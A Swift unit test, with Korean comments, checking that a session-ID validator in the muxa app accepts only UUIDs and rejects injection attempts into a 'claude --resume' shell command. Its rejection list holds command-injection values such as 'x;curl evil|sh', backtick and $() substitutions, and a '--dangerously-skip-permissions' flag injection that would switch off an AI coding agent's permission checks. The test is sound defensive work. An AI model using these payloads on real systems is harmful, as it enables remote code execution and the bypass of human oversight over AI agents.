import Testing
@testable import muxa

/// session_id는 **소켓으로 들어온 외부 입력**이다(같은 uid의 아무 프로세스나 쓸 수 있다). 검증 없이
/// `claude --resume <id>`에 보간하면 개행·`;`·백틱이 그대로 셸에 커밋된다(executeResume이 Enter까지 친다).
/// 이 가드가 느슨해지는 회귀는 조용히 통과하므로 거부 케이스를 못 박는다.
struct ClaudeSessionIndexTests {
    @Test func 정상_UUID는_안전하다() {
        #expect(ClaudeSessionIndex.isSafeSessionId("550e8400-e29b-41d4-a716-446655440000"))
        #expect(ClaudeSessionIndex.isSafeSessionId("550E8400-E29B-41D4-A716-446655440000")) // 대문자도 같은 UUID
    }

    @Test func 주입_문자가_있으면_거부한다() {
        let hostile = [
            "",                         // 빈 값
            ".", "..",                  // 경로 이스케이프
            "a/b",                      // 슬래시(경로 분리)
            "a b",                      // 공백(토큰 분리)
            "x;curl evil|sh",           // 명령 연쇄
            "x\ncurl evil|sh",          // 개행 주입
            "a`whoami`",                // 백틱
            "a$(id)",                   // 명령 치환
            "a'b",                      // 작은따옴표
            // 셸 메타문자가 **하나도 없는** 플래그 주입 — 문자 블랙리스트는 이걸 못 막는다.
            // 인자 자리에 들어가면 `claude --resume --dangerously-skip-permissions`가 조립된다.
            "--dangerously-skip-permissions",
            "-p",
            "abc-123_DEF.4",            // 문자는 안전하지만 UUID가 아니다 → 신뢰하지 않는다
            "550e8400-e29b-41d4-a716",  // 잘린 UUID
        ]
        for id in hostile {
            #expect(!ClaudeSessionIndex.isSafeSessionId(id), "거부돼야 함: \(id)")
        }
    }
}
